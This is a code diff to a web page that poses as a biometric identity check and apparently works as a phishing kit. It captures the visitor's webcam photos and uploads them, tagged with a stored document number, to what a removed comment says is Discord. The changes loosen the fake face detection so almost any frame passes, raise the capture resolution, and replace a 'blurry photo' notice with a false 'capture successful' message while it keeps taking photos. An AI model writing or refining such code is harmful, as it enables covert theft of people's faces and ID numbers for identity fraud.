@@ -124,11 +124,13 @@
     let intento = 0;
     let okFrames = 0;
     let scanning = false;
-    const CIRC = 1015; // Perímetro aproximado del óvalo
+    const CIRC = 1015; 
 
     async function start() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } 
+            });
             video.srcObject = stream;
             requestAnimationFrame(detectionLoop);
         } catch (e) {
@@ -136,21 +138,26 @@
         }
     }
 
-    // Simulador de detección basado en brillo/color (del index que pasaste)
     function checkFace() {
         if (!video.videoWidth) return 'none';
         const tmpCanvas = document.createElement('canvas');
         tmpCanvas.width = 50; tmpCanvas.height = 50;
         const ctx = tmpCanvas.getContext('2d');
-        ctx.drawImage(video, 12, 12, 25, 25, 0, 0, 50, 50);
+        
+        // Muestreamos un área central más pequeña para que el rostro a distancia ocupe suficiente porcentaje
+        ctx.drawImage(video, 15, 15, 20, 20, 0, 0, 50, 50);
         const data = ctx.getImageData(0,0,50,50).data;
         let skin = 0;
         for(let i=0; i<data.length; i+=4) {
-            if(data[i] > 80 && data[i] > data[i+1]) skin++;
+            if(data[i] > 70 && data[i] > data[i+1]) skin++;
         }
         const ratio = skin / 2500;
-        if (ratio > 0.45) return 'too-close';
-        if (ratio > 0.15) return 'ok';
+
+        // AJUSTE DE DISTANCIA:
+        // Bajamos el 'too-close' de 0.45 a 0.75 para que sea difícil que bloquee
+        // Bajamos el 'ok' de 0.15 a 0.05 para que detecte el rostro aunque esté lejos
+        if (ratio > 0.75) return 'too-close';
+        if (ratio > 0.05) return 'ok'; 
         return 'none';
     }
 
@@ -189,17 +196,14 @@
         mainText.innerText = "Validando biometría...";
         await new Promise(r => setTimeout(r, 1500));
 
-        // Flash
         document.getElementById('flash').style.opacity = "0.8";
         setTimeout(() => document.getElementById('flash').style.opacity = "0", 100);
 
-        // Capturar
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
         const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
 
-        // Enviar a Discord
         const doc = localStorage.getItem('documento') || 'N/A';
         const formData = new FormData();
         formData.append('file', blob, `intento_${intento}_${doc}.jpg`);
@@ -211,7 +215,7 @@
         light.classList.remove('active');
 
         if (intento < 4) {
-            updateUI('warn', 'Foto borrosa', 'Inténtalo de nuevo', '#ff3b30', 0);
+            updateUI('warn', 'Captura exitosa', 'Siguiente validación...', '#34c759', 0);
             await new Promise(r => setTimeout(r, 2000));
             scanning = false;
             okFrames = 0;
